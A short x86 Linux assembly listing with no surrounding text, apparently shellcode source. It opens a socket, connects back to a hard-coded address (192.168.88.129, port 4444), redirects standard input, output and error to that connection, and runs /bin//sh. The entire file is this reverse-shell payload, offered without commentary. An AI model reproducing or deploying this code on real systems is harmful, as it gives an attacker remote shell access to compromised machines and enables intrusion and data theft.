section .text
global _start
 
_start :
push 0x66
pop eax 
push 0x1 
pop ebx
xor esi, esi
push esi 
push ebx 
push 0x2
mov ecx, esp 
int 0x80
xchg edi, eax
mov eax, 0x66
mov ebx, 0x3
push 0x8158A8C0
push word 0x5C11
push word 0x02
mov ecx, esp
push byte 0x10
push ecx
push edi
mov ecx, esp
int 0x80
pop ebx
xor eax, eax
xor ecx, ecx
mov ecx, 0x2

loop:
mov eax, 0x3F
int 0x80
dec ecx
jns loop 
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, edx
mov eax, 0xB
int 0x80
